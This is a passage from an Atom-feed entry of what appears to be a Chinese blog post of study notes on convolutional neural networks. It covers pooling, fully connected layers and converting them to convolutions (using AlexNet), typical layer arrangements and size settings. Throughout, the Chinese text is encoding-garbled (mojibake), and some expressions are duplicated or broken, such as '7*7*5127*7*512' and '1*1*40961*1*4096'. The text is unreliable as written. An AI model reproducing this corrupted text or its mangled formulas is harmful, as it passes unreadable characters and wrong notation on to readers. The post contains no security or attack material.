åŒ–å±‚çš„è®¡ç®—ï¼šè¾“å…¥æ•°æ®ä½“å°ºå¯¸<code>W1*H1*D1</code>ï¼Œæœ‰ä¸¤ä¸ªè¶…å‚æ•°ï¼šç©ºé—´å¤§å°<code>F</code>å’Œæ­¥é•¿<code>S</code>ï¼›è¾“å‡ºæ•°æ®ä½“çš„å°ºå¯¸<code>W2*H2*D2</code>ï¼Œå…¶ä¸­ï¼š</p><p><img src="http://ggb0n.cool/images/poolingcalc.jpg" alt=""></p><p>è¿™é‡Œé¢ä¸ä¹‹å‰çš„å·ç§¯çš„å°ºå¯¸è®¡ç®—çš„åŒºåˆ«ä¸»è¦åœ¨äºä¸¤ç‚¹ï¼šé¦–å…ˆåœ¨æ± åŒ–çš„è¿‡ç¨‹ä¸­åŸºæœ¬ä¸ä¼šè¿›è¡Œå¦è¡¥å……ï¼›å…¶æ¬¡æ± åŒ–å‰åæ·±åº¦ä¸å˜ã€‚</p><p><strong>æ™®é€šæ± åŒ–ï¼ˆGeneral Poolingï¼‰</strong>ï¼šé™¤äº†å¸¸ç”¨çš„æœ€å¤§æ± åŒ–ï¼Œæ± åŒ–å•å…ƒè¿˜å¯ä»¥ä½¿ç”¨å…¶ä»–çš„å‡½æ•°ï¼Œæ¯”å¦‚<code>å¹³å‡æ± åŒ–</code>ï¼ˆ<code>average pooling</code>ï¼‰æˆ–<code>L-2èŒƒå¼æ± åŒ–</code>ï¼ˆ<code>L2-norm pooling</code>ï¼‰ã€‚å¹³å‡æ± åŒ–å†å²ä¸Šæ¯”è¾ƒå¸¸ç”¨ï¼Œä½†æ˜¯ç°åœ¨å·²ç»å¾ˆå°‘ä½¿ç”¨äº†ã€‚å› ä¸ºå®è·µè¯æ˜ï¼Œæœ€å¤§æ± åŒ–çš„æ•ˆæœæ¯”å¹³å‡æ± åŒ–è¦å¥½ã€‚</p><p><strong>åå‘ä¼ æ’­</strong>ï¼šå›é¡¾ä¸€ä¸‹åå‘ä¼ æ’­çš„å†…å®¹ï¼Œå…¶ä¸­<code>max(x,y)</code>å‡½æ•°çš„åå‘ä¼ æ’­å¯ä»¥ç®€å•ç†è§£ä¸ºå°†æ¢¯åº¦åªæ²¿æœ€å¤§çš„æ•°å›ä¼ ã€‚å› æ­¤ï¼Œåœ¨å‘å‰ä¼ æ’­ç»è¿‡æ±‡èšå±‚çš„æ—¶å€™ï¼Œé€šå¸¸ä¼šæŠŠæ± ä¸­æœ€å¤§å…ƒç´ çš„ç´¢å¼•è®°å½•ä¸‹æ¥ï¼ˆæœ‰æ—¶è¿™ä¸ªä¹Ÿå«ä½œ<code>é“å²”</code>ï¼ˆ<code>switches</code>ï¼‰ï¼‰ï¼Œè¿™æ ·åœ¨åå‘ä¼ æ’­çš„æ—¶å€™æ¢¯åº¦çš„è·¯ç”±å°±å¾ˆé«˜æ•ˆã€‚</p><p><strong>ä¸ä½¿ç”¨æ± åŒ–å±‚</strong>ï¼šæœ‰äº›æ—¶å€™ï¼Œè¢«å½“åšå›¾åƒå¤„ç†çš„é—®é¢˜å…¶å®ä¹Ÿå¹¶ä¸å®Œå…¨ç­‰åŒäºå›¾åƒå¤„ç†ï¼Œæ¯”å¦‚AlphaGoçš„ä¸‹å›´æ£‹ï¼šæ£‹ç›˜æ˜¯ä¸èƒ½æ‘˜é™¤ä¸€éƒ¨åˆ†ä½ç½®è¿›è¡Œç¼©å°çš„ï¼Œå› æ­¤ä¹Ÿå°±ä¸èƒ½è¿›è¡Œæ± åŒ–ï¼Œäº‹å®ä¸ŠAlphaGoä¹Ÿå¹¶æ²¡æœ‰é‡‡ç”¨æ± åŒ–å±‚ã€‚<br>é€šè¿‡åœ¨å·ç§¯å±‚ä¸­ä½¿ç”¨æ›´å¤§çš„æ­¥é•¿æ¥é™ä½æ•°æ®ä½“çš„å°ºå¯¸ã€‚æœ‰å‘ç°è®¤ä¸ºæœ‰æ—¶å€™ï¼Œåœ¨è®­ç»ƒä¸€ä¸ªè‰¯å¥½çš„ç”Ÿæˆæ¨¡å‹æ—¶ï¼Œå¼ƒç”¨æ±‡èšå±‚ä¹Ÿæ˜¯å¾ˆé‡è¦çš„ã€‚æ¯”å¦‚<code>å˜åŒ–è‡ªç¼–ç å™¨</code>ï¼ˆ<code>VAEsï¼švariational autoencoders</code>ï¼‰å’Œ<code>ç”Ÿæˆæ€§å¯¹æŠ—ç½‘ç»œ</code>ï¼ˆ<code>GANsï¼šgenerative adversarial networks</code>ï¼‰ã€‚æœªæ¥çš„å·ç§¯ç½‘ç»œç»“æ„ä¸­ï¼Œæ± åŒ–å±‚çš„å‘å±•è¿˜çœŸä¸èƒ½ç¡®å®šã€‚</p><h4 id="å…¨è¿æ¥å±‚"><a href="#å…¨è¿æ¥å±‚" class="headerlink" title="å…¨è¿æ¥å±‚"></a>å…¨è¿æ¥å±‚</h4><p>å…¨è¿æ¥å±‚ï¼ˆç®€ç§°<code>FC</code>ï¼‰å°†æ¯ä¸€ä¸ªç»“ç‚¹éƒ½ä¸ä¸Šä¸€å±‚çš„æ‰€æœ‰ç»“ç‚¹ç›¸è¿ï¼Œç”¨æ¥æŠŠå‰è¾¹æå–åˆ°çš„ç‰¹å¾ç»¼åˆèµ·æ¥ã€‚å…¨è¿æ¥å±‚å¯ä»¥æ•´åˆå·ç§¯å±‚æˆ–è€…æ± åŒ–å±‚ä¸­å…·æœ‰ç±»åˆ«åŒºåˆ†æ€§çš„å±€éƒ¨ä¿¡æ¯ã€‚</p><p>ä¸ºäº†æå‡ CNN ç½‘ç»œæ€§èƒ½ï¼Œå…¨è¿æ¥å±‚æ¯ä¸ªç¥ç»å…ƒçš„æ¿€åŠ±å‡½æ•°ä¸€èˆ¬é‡‡ç”¨ReLUå‡½æ•°ã€‚æœ€åä¸€å±‚å…¨è¿æ¥å±‚çš„è¾“å‡ºå€¼è¢«ä¼ é€’ç»™ä¸€ä¸ªè¾“å‡ºï¼Œå¯ä»¥é‡‡ç”¨<code>softmax</code>é€»è¾‘å›å½’ï¼ˆ<code>softmax regression</code>ï¼‰è¿›è¡Œåˆ†ç±»ï¼Œè¯¥å±‚ä¹Ÿå¯ç§°ä¸º<code>softmax</code>å±‚ï¼ˆ<code>softmax laye</code>ï¼‰ã€‚</p><p><strong>å°†å·ç§¯å±‚è½¬åŒ–ä¸ºå…¨è¿æ¥å±‚</strong></p><p>å¯¹äºä»»ä¸€ä¸ªå·ç§¯å±‚ï¼Œéƒ½å­˜åœ¨ä¸€ä¸ªèƒ½å®ç°å’Œå®ƒä¸€æ ·çš„å‰å‘ä¼ æ’­å‡½æ•°çš„å…¨è¿æ¥å±‚ã€‚è¯¥å…¨è¿æ¥å±‚çš„æƒé‡æ˜¯ä¸€ä¸ªå·¨å¤§çš„çŸ©é˜µï¼Œé™¤äº†æŸäº›ç‰¹å®šå—ï¼ˆæ„Ÿå—é‡ï¼‰ï¼Œå…¶ä½™éƒ¨åˆ†éƒ½æ˜¯<code>0</code>ï¼›è€Œåœ¨é<code>0</code>éƒ¨åˆ†ä¸­ï¼Œå¤§éƒ¨åˆ†å…ƒç´ éƒ½æ˜¯ç›¸ç­‰çš„ï¼ˆæƒå€¼å…±äº«ï¼‰ã€‚<br>å¦‚æœæŠŠå…¨è¿æ¥å±‚è½¬åŒ–æˆå·ç§¯å±‚ï¼Œä»¥è¾“å‡ºå±‚çš„<code>Deep11</code>ä¸ºä¾‹ï¼Œä¸å®ƒæœ‰å…³çš„è¾“å…¥ç¥ç»å…ƒåªæœ‰ä¸Šé¢å››ä¸ªï¼Œæ‰€ä»¥åœ¨æƒé‡çŸ©é˜µä¸­ä¸å®ƒç›¸ä¹˜çš„å…ƒç´ ï¼Œé™¤äº†å®ƒæ‰€å¯¹åº”çš„<code>4</code>ä¸ªï¼Œå‰©ä¸‹çš„å‡ä¸º<code>0</code>ï¼Œè¿™ä¹Ÿå°±è§£é‡Šäº†ä¸ºä»€ä¹ˆæƒé‡çŸ©é˜µä¸­æœ‰ä¸ºé›¶çš„éƒ¨åˆ†ã€‚<br>å¦å¤–è¦æŠŠâ€œ<code>å°†å…¨è¿æ¥å±‚è½¬åŒ–æˆå·ç§¯å±‚</code>â€å’Œâ€œ<code>ç”¨çŸ©é˜µä¹˜æ³•å®ç°å·ç§¯</code>â€åŒºåˆ«å¼€ï¼Œè¿™ä¸¤è€…æ˜¯ä¸åŒçš„ï¼Œåè€…æœ¬èº«è¿˜æ˜¯åœ¨è®¡ç®—å·ç§¯ï¼Œåªä¸è¿‡å°†å…¶å±•å¼€ä¸ºçŸ©é˜µç›¸ä¹˜çš„å½¢å¼ï¼Œå¹¶ä¸æ˜¯â€å°†å…¨è¿æ¥å±‚è½¬åŒ–æˆå·ç§¯å±‚â€ï¼Œæ‰€ä»¥é™¤éæƒé‡ä¸­æœ¬èº«æœ‰é›¶ï¼Œå¦åˆ™ç”¨çŸ©é˜µä¹˜æ³•å®ç°å·ç§¯çš„è¿‡ç¨‹ä¸­ä¸ä¼šå‡ºç°å€¼ä¸º<code>0</code>çš„æƒé‡ã€‚</p><p><strong>å°†å…¨è¿æ¥å±‚è½¬åŒ–ä¸ºå·ç§¯å±‚</strong></p><p>ä»»ä½•å…¨è¿æ¥å±‚éƒ½å¯ä»¥è¢«è½¬åŒ–ä¸ºå·ç§¯å±‚ã€‚æ¯”å¦‚ï¼Œä¸€ä¸ª<code>K=409</code>6çš„å…¨è¿æ¥å±‚ï¼Œè¾“å…¥æ•°æ®ä½“çš„å°ºå¯¸æ˜¯ <code>7*7*5127*7*512</code>ï¼Œè¿™ä¸ªå…¨è¿æ¥å±‚å¯ä»¥è¢«ç­‰æ•ˆåœ°çœ‹åšä¸€ä¸ª<code>F=7</code>ï¼Œ<code>P=0</code>ï¼Œ<code>S=1</code>ï¼Œ<code>K=4096</code>ï¼Œ<code>F=7</code>ï¼Œ<code>P=0</code>ï¼Œ<code>S=1</code>ï¼Œ<code>K=4096</code>çš„å·ç§¯å±‚ã€‚æ¢å¥è¯è¯´ï¼Œå°±æ˜¯å°†æ»¤æ³¢å™¨çš„å°ºå¯¸è®¾ç½®ä¸ºå’Œè¾“å…¥æ•°æ®ä½“çš„å°ºå¯¸è®¾ä¸ºä¸€è‡´çš„ã€‚å› ä¸ºåªæœ‰ä¸€ä¸ªå•ç‹¬çš„æ·±åº¦åˆ—è¦†ç›–å¹¶æ»‘è¿‡è¾“å…¥æ•°æ®ä½“ï¼Œæ‰€ä»¥è¾“å‡ºå°†å˜æˆ<code>1*1*40961*1*4096</code>ï¼Œè¿™ä¸ªç»“æœå°±å’Œä½¿ç”¨åˆå§‹çš„é‚£ä¸ªå…¨è¿æ¥å±‚ä¸€æ ·äº†ã€‚<br>è¿™ä¸ªå®é™…ä¸Šä¹Ÿå¾ˆå¥½ç†è§£ï¼Œå› ä¸ºï¼Œå¯¹äºå…¶ä¸­çš„ä¸€ä¸ªå·ç§¯æ»¤æ³¢å™¨ï¼Œè¿™ä¸ªæ»¤æ³¢å™¨çš„çš„æ·±åº¦ä¸º<code>512</code>ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œè™½ç„¶è¿™ä¸ªå·ç§¯æ»¤æ³¢å™¨çš„è¾“å‡ºåªæœ‰<code>1</code>ä¸ªï¼Œä½†æ˜¯å®ƒçš„æƒé‡æœ‰<code>7*7*5127*7*512</code>ï¼Œç›¸å½“äºå·ç§¯æ»¤æ³¢å™¨çš„è¾“å‡ºä¸ºä¸€ä¸ªç¥ç»å…ƒï¼Œè¿™ä¸ªç¥ç»å…ƒä¸ä¸Šä¸€å±‚çš„æ‰€æœ‰ç¥ç»å…ƒç›¸è¿æ¥ï¼Œè€Œè¿™æ ·ä¸å‰ä¸€å±‚æ‰€æœ‰ç¥ç»å…ƒç›¸è¿æ¥çš„ç¥ç»å…ƒä¸€å…±æœ‰<code>4096</code>ä¸ªï¼Œè¿™ä¸å°±æ˜¯ä¸€ä¸ªå…¨è¿æ¥ç½‘ç»œã€‚</p><p>åœ¨ä¸Šè¿°çš„ä¸¤ç§å˜æ¢ä¸­ï¼Œ<code>å°†å…¨è¿æ¥å±‚è½¬åŒ–ä¸ºå·ç§¯å±‚</code>åœ¨å®é™…è¿ç”¨ä¸­æ›´åŠ æœ‰ç”¨ã€‚å‡è®¾ä¸€ä¸ªå·ç§¯ç¥ç»ç½‘ç»œçš„è¾“å…¥æ˜¯<code>224*224*3</code>çš„å›¾åƒï¼Œä¸€ç³»åˆ—çš„å·ç§¯å±‚å’Œæ±‡èšå±‚å°†å›¾åƒæ•°æ®å˜ä¸ºå°ºå¯¸ä¸º<code>7*7*512</code>çš„æ¿€æ´»æ•°æ®ä½“ï¼ˆåœ¨AlexNetä¸­å°±æ˜¯è¿™æ ·ï¼Œé€šè¿‡ä½¿ç”¨5ä¸ªæ±‡èšå±‚æ¥å¯¹è¾“å…¥æ•°æ®è¿›è¡Œç©ºé—´ä¸Šçš„é™é‡‡æ ·ï¼Œæ¯æ¬¡å°ºå¯¸ä¸‹é™ä¸€åŠï¼Œæ‰€ä»¥æœ€ç»ˆç©ºé—´å°ºå¯¸ä¸º<em>224/2/2/2/2/2=7</em>ï¼‰ã€‚ä»è¿™é‡Œå¯ä»¥çœ‹åˆ°ï¼ŒAlexNetä½¿ç”¨äº†ä¸¤ä¸ªå°ºå¯¸ä¸º<code>4096</code>çš„å…¨è¿æ¥å±‚ï¼Œæœ€åä¸€ä¸ªæœ‰<code>1000</code>ä¸ªç¥ç»å…ƒçš„å…¨è¿æ¥å±‚ç”¨äºè®¡ç®—åˆ†ç±»è¯„åˆ†ã€‚æˆ‘ä»¬å¯ä»¥å°†è¿™3ä¸ªå…¨è¿æ¥è½¬åŒ–ä¸º3ä¸ªå·ç§¯å±‚ï¼š</p><blockquote><p>(1) é’ˆå¯¹ç¬¬ä¸€ä¸ªè¿æ¥åŒºåŸŸæ˜¯<code>[7x7x512]</code>çš„å…¨è¿æ¥å±‚ï¼Œä»¤å…¶æ»¤æ³¢å™¨å°ºå¯¸ä¸º<code>F=7</code>ï¼Œè¿™æ ·è¾“å‡ºæ•°æ®ä½“å°±ä¸º<code>[1x1x4096]</code>äº†ã€‚</p><p>(2) é’ˆå¯¹ç¬¬äºŒä¸ªå…¨è¿æ¥å±‚ï¼Œä»¤å…¶æ»¤æ³¢å™¨å°ºå¯¸ä¸º<code>F=1</code>ï¼Œè¿™æ ·è¾“å‡ºæ•°æ®ä½“ä¸º<code>[1x1x4096]</code>ã€‚</p><p>(3) å¯¹æœ€åä¸€ä¸ªå…¨è¿æ¥å±‚ä¹Ÿåšç±»ä¼¼çš„ï¼Œä»¤å…¶<code>F=1</code>ï¼Œæœ€ç»ˆè¾“å‡ºä¸º<code>[1x1x1000]</code>ã€‚</p></blockquote><p>è¿™æ ·åšçš„ç›®çš„æ˜¯è®©å·ç§¯ç½‘ç»œåœ¨ä¸€å¼ æ›´å¤§çš„è¾“å…¥å›¾ç‰‡ä¸Šæ»‘åŠ¨ï¼Œå¾—åˆ°å¤šä¸ªè¾“å‡ºï¼Œè¿™æ ·çš„è½¬åŒ–å¯ä»¥è®©æˆ‘ä»¬åœ¨å•ä¸ªå‘å‰ä¼ æ’­çš„è¿‡ç¨‹ä¸­å®Œæˆä¸Šè¿°çš„æ“ä½œã€‚</p><p>è‡³æ­¤ï¼Œå¯¹CNNå„å±‚çš„å­¦ä¹ æš‚æ—¶å‘Šä¸€æ®µè½ï¼Œæœ€èµ·ç æœ‰äº†ä¸€å®šçš„äº†è§£ã€‚ä¸‹é¢å°†å¯¹å„å±‚ä¹‹é—´çš„ç»“æ„è¿›è¡Œå­¦ä¹ ã€‚</p><h3 id="å·ç§¯ç¥ç»ç½‘ç»œç»“æ„ç‰¹ç‚¹"><a href="#å·ç§¯ç¥ç»ç½‘ç»œç»“æ„ç‰¹ç‚¹" class="headerlink" title="å·ç§¯ç¥ç»ç½‘ç»œç»“æ„ç‰¹ç‚¹"></a>å·ç§¯ç¥ç»ç½‘ç»œç»“æ„ç‰¹ç‚¹</h3><p>å·ç§¯ç¥ç»ç½‘ç»œé€šå¸¸æ˜¯ç”±ä¸‰ç§å±‚æ„æˆï¼šå·ç§¯å±‚ï¼Œæ± åŒ–å±‚ï¼ˆé™¤éç‰¹åˆ«è¯´æ˜ï¼Œä¸€èˆ¬å°±æ˜¯æœ€å¤§å€¼æ± åŒ–ï¼‰å’Œå…¨è¿æ¥å±‚ã€‚ReLUå±‚é€šå¸¸åœ¨å·ç§¯å±‚ä¹‹åï¼Œå®ƒé€å…ƒç´ åœ°è¿›è¡Œæ¿€æ´»å‡½æ•°æ“ä½œï¼Œå¸¸å¸¸å°†å®ƒä¸å·ç§¯å±‚çœ‹ä½œæ˜¯åŒä¸€å±‚ã€‚</p><h4 id="å±‚çš„æ’åˆ—è§„å¾‹"><a href="#å±‚çš„æ’åˆ—è§„å¾‹" class="headerlink" title="å±‚çš„æ’åˆ—è§„å¾‹"></a>å±‚çš„æ’åˆ—è§„å¾‹</h4><p>å·ç§¯ç¥ç»ç½‘ç»œæœ€å¸¸è§çš„å½¢å¼å°±æ˜¯å°†ä¸€äº›å·ç§¯å±‚å’ŒReLUå±‚æ”¾åœ¨ä¸€èµ·ï¼Œå…¶åç´§è·Ÿæ± åŒ–å±‚ï¼Œç„¶åé‡å¤å¦‚æ­¤ç›´åˆ°å›¾åƒåœ¨ç©ºé—´ä¸Šè¢«ç¼©å°åˆ°ä¸€ä¸ªè¶³å¤Ÿå°çš„å°ºå¯¸ï¼Œåœ¨æŸä¸ªåœ°æ–¹è¿‡æ¸¡æˆæˆå…¨è¿æ¥å±‚ä¹Ÿè¾ƒä¸ºå¸¸è§ã€‚æœ€åçš„å…¨è¿æ¥å±‚å¾—åˆ°è¾“å‡ºï¼Œæ¯”å¦‚åˆ†ç±»è¯„åˆ†ç­‰ã€‚æ¢å¥è¯è¯´ï¼Œæœ€å¸¸è§çš„å·ç§¯ç¥ç»ç½‘ç»œç»“æ„å¦‚ä¸‹ï¼š</p><p><img src="http://ggb0n.cool/images/pailie.jpg" alt=""></p><p>å…¶ä¸­<code>*</code>æŒ‡çš„æ˜¯é‡å¤æ¬¡æ•°ï¼Œ<code>POOL?</code>æŒ‡çš„æ˜¯ä¸€ä¸ªå¯é€‰çš„æ± åŒ–å±‚ã€‚å…¶ä¸­<code>N&gt;=0</code>,é€šå¸¸<code>N&lt;=3</code>ï¼Œ<code>M&gt;=0</code>ï¼Œ<code>K&gt;=0</code>ï¼Œ<code>K&lt;3</code>ã€‚ä¾‹å¦‚ï¼Œä¸‹é¢æ˜¯ä¸€äº›å¸¸è§çš„ç½‘ç»œç»“æ„è§„å¾‹ï¼š</p><ul><li><strong>INPUT -&gt; FC</strong> ï¼šå®ç°ä¸€ä¸ªçº¿æ€§åˆ†ç±»å™¨ï¼Œæ­¤å¤„<code>N = M = K = 0</code>ï¼›</li><li><strong>INPUT -&gt; CONV -&gt; RELU -&gt; FC</strong>ï¼šå•å±‚çš„å·ç§¯ç¥ç»ç½‘ç»œï¼›</li><li><strong>INPUT -&gt; [CONV -&gt; RELU -&gt; POOL]*2 -&gt; FC -&gt; RELU -&gt; FC</strong>ï¼šæ­¤å¤„åœ¨æ¯ä¸ªæ±‡èšå±‚ä¹‹é—´æœ‰ä¸€ä¸ªå·ç§¯å±‚ï¼Œè¿™ç§ç½‘ç»œå°±æ˜¯ç®€å•çš„å¤šå±‚çš„å·ç§¯ç¥ç»ç½‘ç»œï¼›</li><li><strong>INPUT -&gt; [CONV -&gt; RELU -&gt; CONV -&gt; RELU -&gt; POOL]*3 -&gt; [FC -&gt; RELU]*2 -&gt; FC</strong>ï¼šæ­¤å¤„æ¯ä¸ªæ±‡èšå±‚å‰æœ‰ä¸¤ä¸ªå·ç§¯å±‚ï¼Œè¿™ä¸ªæ€è·¯é€‚ç”¨äºæ›´å¤§æ›´æ·±çš„ç½‘ç»œï¼Œå› ä¸ºåœ¨æ‰§è¡Œå…·æœ‰ç ´åæ€§çš„æ±‡èšæ“ä½œå‰ï¼Œå¤šé‡çš„å·ç§¯å±‚å¯ä»¥ä»è¾“å…¥æ•°æ®ä¸­å­¦ä¹ åˆ°æ›´å¤šçš„å¤æ‚ç‰¹å¾ã€‚</li></ul><h4 id="å·ç§¯å±‚çš„å¤§å°é€‰æ‹©"><a href="#å·ç§¯å±‚çš„å¤§å°é€‰æ‹©" class="headerlink" title="å·ç§¯å±‚çš„å¤§å°é€‰æ‹©"></a>å·ç§¯å±‚çš„å¤§å°é€‰æ‹©</h4><p><strong>å‡ ä¸ªå°æ»¤æ³¢å™¨å·ç§¯å±‚çš„ç»„åˆæ¯”ä¸€ä¸ªå¤§æ»¤æ³¢å™¨å·ç§¯å±‚å¥½</strong>ã€‚å‡è®¾ä½ ä¸€å±‚ä¸€å±‚åœ°é‡å äº†<code>3</code>ä¸ª<code>3*3</code>çš„å·ç§¯å±‚ï¼ˆå±‚ä¸å±‚ä¹‹é—´æœ‰ReLUæ¿€æ´»å‡½æ•°ï¼‰ã€‚åœ¨è¿™ä¸ªæ’åˆ—ä¸‹ï¼Œç¬¬ä¸€ä¸ªå·ç§¯å±‚ä¸­çš„æ¯ä¸ªç¥ç»å…ƒéƒ½å¯¹è¾“å…¥æ•°æ®ä½“æœ‰ä¸€ä¸ª<code>3*3</code>çš„è§†é‡ã€‚ç¬¬äºŒä¸ªå·ç§¯å±‚ä¸Šçš„ç¥ç»å…ƒå¯¹ç¬¬ä¸€ä¸ªå·ç§¯å±‚æœ‰ä¸€ä¸ª<code>3*3</code>çš„è§†é‡ï¼Œä¹Ÿå°±æ˜¯å¯¹è¾“å…¥æ•°æ®ä½“æœ‰<code>5*5</code>çš„è§†é‡ã€‚åŒæ ·ï¼Œåœ¨ç¬¬ä¸‰ä¸ªå·ç§¯å±‚ä¸Šçš„ç¥ç»å…ƒå¯¹ç¬¬äºŒä¸ªå·ç§¯å±‚æœ‰<code>3*3</code>çš„è§†é‡ï¼Œä¹Ÿå°±æ˜¯å¯¹è¾“å…¥æ•°æ®ä½“æœ‰<code>7*7</code>çš„è§†é‡ã€‚</p><p>å‡è®¾ä¸é‡‡ç”¨è¿™<code>3</code>ä¸ª<code>3*3</code>çš„å·ç§¯å±‚ï¼Œè€Œæ˜¯ä½¿ç”¨ä¸€ä¸ªå•ç‹¬çš„æœ‰<code>7*7</code>çš„æ„Ÿå—é‡çš„å·ç§¯å±‚ï¼Œé‚£ä¹ˆæ‰€æœ‰ç¥ç»å…ƒçš„æ„Ÿå—é‡ä¹Ÿæ˜¯<code>7*7</code>ã€‚å¤šä¸ªå·ç§¯å±‚ä¸éçº¿æ€§çš„æ¿€æ´»å±‚äº¤æ›¿çš„ç»“æ„ï¼Œæ¯”å•ä¸€å·ç§¯å±‚çš„ç»“æ„æ›´èƒ½æå–å‡ºæ·±å±‚çš„æ›´å¥½çš„ç‰¹å¾ã€‚ä½†æ˜¯ä¹Ÿä¼šæœ‰ä¸€äº›ç¼ºç‚¹ï¼Œå‡è®¾æ‰€æœ‰çš„æ•°æ®æœ‰<code>C</code>ä¸ªé€šé“ï¼Œé‚£ä¹ˆå•ç‹¬çš„<code>7*7</code>å·ç§¯å±‚å°†ä¼šåŒ…å«<code>C*(7*7*C)=49C^2</code>ä¸ªå‚æ•°ï¼Œè€Œ<code>3</code>ä¸ª<code>3*3</code>çš„å·ç§¯å±‚çš„ç»„åˆä»…æœ‰<code>3*(C*(3*3*C))=27C^2</code>ä¸ªå‚æ•°</p><p>ç›´è§‚è¯´æ¥ï¼Œæœ€å¥½é€‰æ‹©å¸¦æœ‰å°æ»¤æ³¢å™¨çš„å·ç§¯å±‚ç»„åˆï¼Œè€Œä¸æ˜¯ç”¨ä¸€ä¸ªå¸¦æœ‰å¤§çš„æ»¤æ³¢å™¨çš„å·ç§¯å±‚ã€‚å‰è€…å¯ä»¥è¡¨è¾¾å‡ºè¾“å…¥æ•°æ®ä¸­æ›´å¤šä¸ªå¼ºåŠ›ç‰¹å¾ï¼Œä½¿ç”¨çš„å‚æ•°ä¹Ÿæ›´å°‘ã€‚å”¯ä¸€çš„ä¸è¶³æ˜¯ï¼Œåœ¨è¿›è¡Œåå‘ä¼ æ’­æ—¶ï¼Œä¸­é—´çš„å·ç§¯å±‚å¯èƒ½ä¼šå¯¼è‡´å ç”¨æ›´å¤šçš„å†…å­˜ã€‚</p><h4 id="å±‚çš„å°ºå¯¸è®¾ç½®"><a href="#å±‚çš„å°ºå¯¸è®¾ç½®" class="headerlink" title="å±‚çš„å°ºå¯¸è®¾ç½®"></a>å±‚çš„å°ºå¯¸è®¾ç½®</h4><p>å„å±‚å¸¸è§çš„å°ºå¯¸è®¾ç½®å¦‚ä¸‹ï¼š</p><ul><li><strong>è¾“å…¥å±‚</strong>ï¼šåº”è¯¥èƒ½è¢«<code>2</code>æ•´é™¤å¾ˆå¤šæ¬¡ã€‚å¸¸ç”¨æ•°å­—åŒ…æ‹¬<code>32</code>ï¼Œ<code>64</code>ï¼Œ<code>96</code>æˆ–<code>224</code>ï¼ˆæ¯”å¦‚ImageNetå·ç§¯ç¥ç»ç½‘ç»œï¼‰ï¼Œ<code>384</code>å’Œ<code>512</code>ã€‚</li><li><strong>å·ç§¯å±‚</strong>ï¼šåº”è¯¥ä½¿ç”¨å°å°ºå¯¸æ»¤æ³¢å™¨ï¼ˆæ¯”å¦‚<code>3*3</code>æˆ–æœ€å¤š<code>5*5</code>ï¼‰ï¼Œä½¿ç”¨æ­¥é•¿<code>S=1</code>ã€‚è¿˜æœ‰ä¸€ç‚¹éå¸¸é‡è¦ï¼Œå°±æ˜¯å¯¹è¾“å…¥æ•°æ®è¿›è¡Œ<code>é›¶å¡«å……</code>ï¼Œè¿™æ ·å·ç§¯å±‚å°±ä¸ä¼šæ”¹å˜è¾“å…¥æ•°æ®åœ¨ç©ºé—´ç»´åº¦ä¸Šçš„å°ºå¯¸ã€‚æ¯”å¦‚ï¼Œå½“<code>F=3</code>ï¼Œé‚£å°±ä½¿ç”¨<code>P=1</code>æ¥ä¿æŒè¾“å…¥å°ºå¯¸ã€‚å½“<code>F=5</code>ï¼Œ<code>P=2</code>ï¼Œä¸€èˆ¬å¯¹äºä»»æ„<code>F</code>ï¼Œå½“<code>P=(F-1)/2</code>çš„æ—¶å€™èƒ½ä¿æŒè¾“å…¥å°ºå¯¸ã€‚å¦‚æœå¿…é¡»ä½¿ç”¨æ›´å¤§çš„æ»¤æ³¢å™¨å°ºå¯¸ï¼ˆæ¯”å¦‚<code>7*7</code>ä¹‹ç±»ï¼‰ï¼Œé€šå¸¸åªç”¨åœ¨ç¬¬ä¸€ä¸ªé¢å¯¹åŸå§‹å›¾åƒçš„å·ç§¯å±‚ä¸Šã€‚</li><li><strong>æ± åŒ–å±‚</strong>ï¼šè´Ÿè´£å¯¹è¾“å…¥æ•°æ®çš„ç©ºé—´ç»´åº¦è¿›è¡Œé™é‡‡æ ·ã€‚æœ€å¸¸ç”¨çš„è®¾ç½®æ˜¯ç”¨<code>2*2</code>æ„Ÿå—é‡ï¼ˆå³<code>F=2</code>ï¼‰çš„æœ€å¤§å€¼æ± åŒ–ï¼Œæ­¥é•¿ä¸º<code>S=2</code>ã€‚æ³¨æ„è¿™ä¸€æ“ä½œå°†ä¼šæŠŠè¾“å…¥æ•°æ®ä¸­<code>75%</code>çš„æ¿€æ´»æ•°æ®ä¸¢å¼ƒï¼ˆå› ä¸ºå¯¹å®½åº¦å’Œé«˜åº¦éƒ½è¿›è¡Œäº†<code>2</code>çš„ä¸‹é‡‡æ ·ï¼‰ã€‚<br>å¦ä¸€ä¸ªä¸é‚£ä¹ˆå¸¸ç”¨çš„è®¾ç½®æ˜¯ä½¿ç”¨<code>3*3</code>çš„æ„Ÿå—é‡ï¼Œæ­¥é•¿ä¸º<code>2</code>ã€‚æœ€å¤§å€¼æ± åŒ–çš„æ„Ÿå—é‡å°ºå¯¸å¾ˆå°‘æœ‰è¶…è¿‡<code>3</code>çš„ï¼Œå› ä¸ºæ± åŒ–æ“ä½œè¿‡åº¦ï¼Œæ˜“é€ æˆæ•°æ®ä¿¡æ¯ä¸¢å¤±ï¼Œè¿™é€šå¸¸ä¼šå¯¼è‡´ç®—æ³•æ€§èƒ½å˜å·®ã€‚</li></ul><p>è‡³æ­¤ï¼Œå¯¹å·ç§¯ç¥ç»ç½‘ç»œçš„å­¦ä¹ åˆ°æ­¤å‘Šä¸€æ®µè½ï¼Œå¾ˆå¤šæ·±å±‚æ¬¡çš„åœ°æ–¹å…¶å®è¿˜æ²¡ææ‡‚ï¼Œåœ¨ä»¥åçš„å®è·µä¸­å†åŠ æ·±å­¦ä¹ å§ã€‚</p><p>å‚è€ƒï¼š<br><a href="https://zhuanlan.zhihu.com/p/37261854">å·ç§¯ç¥ç»ç½‘ç»œå…¥é—¨è¯¦è§£</a><br><a href="https://www.bilibili.com/video/BV1hp411d7ij/?spm_id_from=333.788.videocard.0">æå®æ¯…æœºå™¨å­¦ä¹ æ•™å­¦è§†é¢‘</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;æœ¬æ–‡ä¸»è¦æ˜¯è®°å½•ä¸€ä¸‹å¯¹&lt;code&gt;å·ç§¯ç¥ç»ç½‘ç»œ&lt;/code&gt;ï¼ˆ&lt;code&gt;CNN&lt;/code&gt;ï¼‰çš„å­¦ä¹ ï¼Œè¿™æ˜¯åœ¨æœºå™¨å­¦ä¹ ï¼Œå…·ä½“æ¥è¯´æ˜¯æ·±åº¦å­¦ä¹ ä¸­çš„ç¬¬ä¸€æ­¥ï¼Œè®¤çœŸå­¦ä¹ ã€å¥½å¥½è®°å½•ã€‚&lt;/p&gt;
